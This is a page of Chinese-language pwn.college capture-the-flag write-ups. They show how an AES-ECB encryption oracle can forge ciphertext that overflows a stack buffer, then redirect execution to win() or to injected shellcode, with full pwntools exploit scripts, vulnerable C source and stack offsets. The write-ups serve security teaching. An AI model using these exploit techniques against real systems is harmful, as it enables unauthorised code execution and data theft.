-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/PwnCollege/PwnCollege-is-ecb-to-win-easy/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/PwnCollege/PwnCollege-is-ecb-to-win-easy/" class="post-title-link" itemprop="url">PwnCollege - IS ECB-to-Win (easy)</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2026-03-20 14:33:13 / Modified: 14:33:52" itemprop="dateCreated datePublished" datetime="2026-03-20T14:33:13+08:00">2026-03-20</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/PwnCollege/PwnCollege-is-ecb-to-win-easy/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/PwnCollege/PwnCollege-is-ecb-to-win-easy/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <blockquote>
-<p>Concepts used: Cryptography + Binary Exploitation</p>
-</blockquote>
-<h2 id="source">Source</h2>
-<p><code>vulnerable-overflow</code> 读取密文，先解密第一个 block 验证
-header 和 length，再解密剩余 block 到栈上固定大小的
-<code>message[60]</code>。因为 <code>ciphertext_len</code>
-没有上限检查，<code>EVP_DecryptUpdate</code> 会直接造成栈溢出。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">challenge</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> key[<span class="number">16</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="type">char</span> header[<span class="number">8</span>];</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> length;</span><br><span class="line">        <span class="type">char</span> message[<span class="number">60</span>];</span><br><span class="line">    &#125; plaintext = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ... key init, read ciphertext from stdin ...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// verify first block</span></span><br><span class="line">    EVP_DecryptUpdate(ctx, (<span class="type">char</span> *)&amp;plaintext, &amp;decrypted_len, ciphertext, <span class="number">16</span>);</span><br><span class="line">    assert(<span class="built_in">memcmp</span>(plaintext.header, <span class="string">&quot;VERIFIED&quot;</span>, <span class="number">8</span>) == <span class="number">0</span>);</span><br><span class="line">    assert(plaintext.length &lt;= <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// buffer overflow: no bounds check on ciphertext_len</span></span><br><span class="line">    EVP_DecryptUpdate(ctx, plaintext.message, &amp;decrypted_len,</span><br><span class="line">                      ciphertext + <span class="number">16</span>, ciphertext_len - <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><code>dispatch</code> 是加密 oracle，接受最多 16 字节的 message，拼上
-<code>VERIFIED</code> header 后用相同 key 的 AES-ECB 加密输出：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="built_in">open</span>(<span class="string">&quot;/challenge/.key&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">cipher = AES.new(key=key, mode=AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">message = sys.stdin.buffer.read1()</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(message) &lt;= <span class="number">16</span>, <span class="string">&quot;Your message is too long!&quot;</span></span><br><span class="line">plaintext = <span class="string">b&quot;VERIFIED&quot;</span> + struct.pack(<span class="string">b&quot;&lt;Q&quot;</span>, <span class="built_in">len</span>(message)) + message</span><br><span class="line">ciphertext = cipher.encrypt(pad(plaintext, cipher.block_size))</span><br><span class="line">sys.stdout.buffer.write(ciphertext)</span><br></pre></td></tr></table></figure>
-<h2 id="analysis">Analysis</h2>
-<p>ECB 模式下每个 16 字节 block 独立加密，相同明文 block 产生相同密文
-block。因此可以：</p>
-<ol type="1">
-<li>调用 <code>dispatch</code> 获取合法的第一个 block（包含
-<code>VERIFIED</code> header）的密文</li>
-<li>将 payload 按 16 字节分块，逐块调用 <code>dispatch</code> 加密</li>
-<li>拼接密文发送给
-<code>vulnerable-overflow</code>，解密后得到我们的任意 payload</li>
-</ol>
-<p>从 stack dump 中可以看到：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">| 0x00007fff9c9fad20 (rsp+0x0040) | message buffer 开始位置</span><br><span class="line">| ...                              | 120 bytes of &#x27;A&#x27; padding</span><br><span class="line">| 0x00007fff9c9fad98 (rsp+0x00b8) | saved return address -&gt; 0x401e96</span><br></pre></td></tr></table></figure>
-<ul>
-<li>buffer 起始: <code>rsp+0x40</code>，saved rip: <code>rsp+0xb8</code>
-→ offset = <strong>120 bytes</strong></li>
-<li><code>win()</code> 地址: <code>0x4018f7</code></li>
-</ul>
-<h2 id="exploit">Exploit</h2>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;info&quot;</span></span><br><span class="line"></span><br><span class="line">OFFSET = <span class="number">120</span></span><br><span class="line">WIN_ADDR = <span class="number">0x4018f7</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_block</span>(<span class="params">block_data</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;调用 dispatch 加密单个 16 字节 block，返回对应密文&quot;&quot;&quot;</span></span><br><span class="line">    p = process([<span class="string">&quot;/challenge/dispatch&quot;</span>], level=<span class="string">&quot;error&quot;</span>)</span><br><span class="line">    p.send(block_data)</span><br><span class="line">    p.shutdown(<span class="string">&quot;send&quot;</span>)  <span class="comment"># 必须发送 EOF，否则 read1() 阻塞</span></span><br><span class="line">    ct = p.recvall()</span><br><span class="line">    p.close()</span><br><span class="line">    <span class="keyword">return</span> ct[<span class="number">16</span>:<span class="number">32</span>]  <span class="comment"># 跳过第一个 block (VERIFIED header)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_payload</span>():</span><br><span class="line">    <span class="comment"># 获取合法的第一个 block 密文 (通过 dispatch 加密任意 16 字节 message)</span></span><br><span class="line">    p_init = process([<span class="string">&quot;/challenge/dispatch&quot;</span>], level=<span class="string">&quot;error&quot;</span>)</span><br><span class="line">    p_init.send(<span class="string">b&quot;A&quot;</span> * <span class="number">16</span>)</span><br><span class="line">    p_init.shutdown(<span class="string">&quot;send&quot;</span>)</span><br><span class="line">    first_block_ct = p_init.recvall()[:<span class="number">16</span>]</span><br><span class="line">    p_init.close()</span><br><span class="line"></span><br><span class="line">    raw_payload = <span class="string">b&quot;A&quot;</span> * OFFSET + p64(WIN_ADDR)</span><br><span class="line">    padded_payload = pad(raw_payload, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 逐块加密，拼接密文</span></span><br><span class="line">    final_ct = first_block_ct</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(padded_payload), <span class="number">16</span>):</span><br><span class="line">        final_ct += encrypt_block(padded_payload[i : i + <span class="number">16</span>])</span><br><span class="line"></span><br><span class="line">    log.success(<span class="string">f&quot;Payload length: <span class="subst">&#123;<span class="built_in">len</span>(final_ct)&#125;</span> bytes&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> final_ct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    payload = build_payload()</span><br><span class="line">    target = process(<span class="string">&quot;/challenge/vulnerable-overflow&quot;</span>)</span><br><span class="line">    target.send(payload)</span><br><span class="line">    target.shutdown(<span class="string">&quot;send&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(target.recvall().decode(errors=<span class="string">&quot;ignore&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exploit()</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/PwnCollege/PwnCollege-is-ecb-to-shellcode-hard/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/PwnCollege/PwnCollege-is-ecb-to-shellcode-hard/" class="post-title-link" itemprop="url">PwnCollege - IS ECB-to-Shellcode (hard)</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2026-03-20 14:32:45 / Modified: 14:32:46" itemprop="dateCreated datePublished" datetime="2026-03-20T14:32:45+08:00">2026-03-20</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/PwnCollege/PwnCollege-is-ecb-to-shellcode-hard/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/PwnCollege/PwnCollege-is-ecb-to-shellcode-hard/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>同 easy 版本的 ECB oracle + shellcode 注入，但没有 stack
-dump，需要手动逆向 offset。</p>
-<h2 id="analysis">Analysis</h2>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r2 -A -q -c <span class="string">&quot;pdf @ sym.challenge&quot;</span> /challenge/vulnerable-overflow</span><br></pre></td></tr></table></figure>
-<p>关键溢出点：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">; plaintext struct 起始于 s1 = rbp - 0x70</span><br><span class="line">│           0x004016d3      lea rsi, [s1]           ; rbp - 0x70</span><br><span class="line">; message buffer = s1 + 0x10 (跳过 header + length)</span><br><span class="line">│           0x004016d7      add rsi, 0x10           ; rbp - 0x60</span><br><span class="line">; buffer overflow</span><br><span class="line">│           0x004016e1      call sym.imp.EVP_DecryptUpdate</span><br></pre></td></tr></table></figure>
-<ul>
-<li>message buffer: <code>rbp - 0x60</code></li>
-<li>saved rip: <code>rbp + 0x08</code></li>
-<li>offset = <code>0x60 + 0x08</code> = <strong>104 bytes</strong> (与
-easy 版本相同)</li>
-</ul>
-<p>Exploit 完全相同，只需对应修改 buffer
-地址即可。实际上因为栈地址固定且相同，exploit 代码可以直接复用。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/PwnCollege/PwnCollege-is-ecb-to-shellcode-easy/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/PwnCollege/PwnCollege-is-ecb-to-shellcode-easy/" class="post-title-link" itemprop="url">PwnCollege - IS ECB-to-Shellcode (easy)</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2026-03-20 14:31:44 / Modified: 14:32:31" itemprop="dateCreated datePublished" datetime="2026-03-20T14:31:44+08:00">2026-03-20</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/PwnCollege/PwnCollege-is-ecb-to-shellcode-easy/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/PwnCollege/PwnCollege-is-ecb-to-shellcode-easy/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>与 ECB-to-Win 类似的 ECB oracle + buffer overflow，但没有
-<code>win()</code> 函数，需要注入 shellcode 并跳转执行。栈可执行。</p>
-<h2 id="source">Source</h2>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">challenge</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> key[<span class="number">16</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="type">char</span> header[<span class="number">8</span>];</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> length;</span><br><span class="line">        <span class="type">char</span> message[<span class="number">48</span>];  <span class="comment">// 比 win 版本更小</span></span><br><span class="line">    &#125; plaintext = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ... 同样的 ECB 解密流程 ...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// buffer overflow</span></span><br><span class="line">    EVP_DecryptUpdate(ctx, plaintext.message, &amp;decrypted_len,</span><br><span class="line">                      ciphertext + <span class="number">16</span>, ciphertext_len - <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 会打印反汇编后的 shellcode 和栈布局</span></span><br><span class="line">    print_disassembly(plaintext.message, decrypted_len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="analysis">Analysis</h2>
-<p>从 stack dump 中读取关键信息：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">| 0x7fffffffec90 (rsp+0x0040) | message buffer 开始 (shellcode 放这里)</span><br><span class="line">| ...                          | 104 bytes to saved rip</span><br><span class="line">| 0x7fffffffecf8 (rsp+0x00a8) | saved return address</span><br></pre></td></tr></table></figure>
-<ul>
-<li>buffer 起始: <code>0x7fffffffec90</code></li>
-<li>offset = <code>0xa8 - 0x40</code> = <strong>104 bytes</strong></li>
-<li>栈地址固定（ASLR 未随机化栈），直接将返回地址覆盖为 buffer
-起始地址</li>
-</ul>
-<h2 id="exploit">Exploit</h2>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.update(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;info&quot;</span></span><br><span class="line"></span><br><span class="line">OFFSET = <span class="number">104</span></span><br><span class="line">BUFFER_ADDR = <span class="number">0x7fffffffec90</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_block</span>(<span class="params">block_data</span>):</span><br><span class="line">    p = process([<span class="string">&quot;/challenge/dispatch&quot;</span>], level=<span class="string">&quot;error&quot;</span>)</span><br><span class="line">    p.send(block_data)</span><br><span class="line">    p.shutdown(<span class="string">&quot;send&quot;</span>)</span><br><span class="line">    ct = p.recvall()</span><br><span class="line">    p.close()</span><br><span class="line">    <span class="keyword">return</span> ct[<span class="number">16</span>:<span class="number">32</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_payload</span>():</span><br><span class="line">    shellcode = asm(shellcraft.cat(<span class="string">&quot;/flag&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># shellcode + nop sled + return address</span></span><br><span class="line">    raw_payload = shellcode.ljust(OFFSET, <span class="string">b&quot;\x90&quot;</span>) + p64(BUFFER_ADDR)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取合法的第一个 block 密文</span></span><br><span class="line">    p_init = process([<span class="string">&quot;/challenge/dispatch&quot;</span>], level=<span class="string">&quot;error&quot;</span>)</span><br><span class="line">    p_init.send(<span class="string">b&quot;\x90&quot;</span> * <span class="number">16</span>)</span><br><span class="line">    p_init.shutdown(<span class="string">&quot;send&quot;</span>)</span><br><span class="line">    first_block_ct = p_init.recvall()[:<span class="number">16</span>]</span><br><span class="line">    p_init.close()</span><br><span class="line"></span><br><span class="line">    padded_payload = pad(raw_payload, <span class="number">16</span>)</span><br><span class="line">    final_ct = first_block_ct</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(padded_payload), <span class="number">16</span>):</span><br><span class="line">        final_ct += encrypt_block(padded_payload[i : i + <span class="number">16</span>])</span><br><span class="line"></span><br><span class="line">    log.success(<span class="string">f&quot;Payload length: <span class="subst">&#123;<span class="built_in">len</span>(final_ct)&#125;</span> bytes&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> final_ct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    payload = build_payload()</span><br><span class="line">    target = process(<span class="string">&quot;/challenge/vulnerable-overflow&quot;</span>, env=&#123;&#125;)</span><br><span class="line">    target.send(payload)</span><br><span class="line">    target.shutdown(<span class="string">&quot;send&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(target.recvall().decode(errors=<span class="string">&quot;ignore&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exploit()</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/PwnCollege/PwnCollege-binary-exploitation/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/PwnCollege/PwnCollege-binary-exploitation/" class="post-title-link" itemprop="url">PwnCollege - binary exploitation</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2026-03-19 21:17:10" itemprop="dateCreated datePublished" datetime="2026-03-19T21:17:10+08:00">2026-03-19</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/PwnCollege/PwnCollege-binary-exploitation/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/PwnCollege/PwnCollege-binary-exploitation/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="your-first-overflow-easy">Your First Overflow (easy)</h1>
-<p>Buffer 20 bytes, win variable 20 bytes after buffer start. Overflow
-to set win variable non-zero.</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hacker@binary-exploitation~your-first-overflow-easy:~$ /challenge/binary-exploitation-first-overflow-w</span><br><span class="line"><span class="comment"># buffer at rsp+0x0030, win variable at rsp+0x0040 (20 bytes after buffer)</span></span><br><span class="line"><span class="comment"># send 21+ bytes to overflow into win variable</span></span><br><span class="line">Send your payload (up to 4096 bytes)!</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">You win! Here is your flag:</span><br><span class="line">pwn.college&#123;*******************************************&#125;</span><br></pre></td></tr></table></figure>
-<h1 id="your-first-overflow-hard">Your First Overflow (hard)</h1>
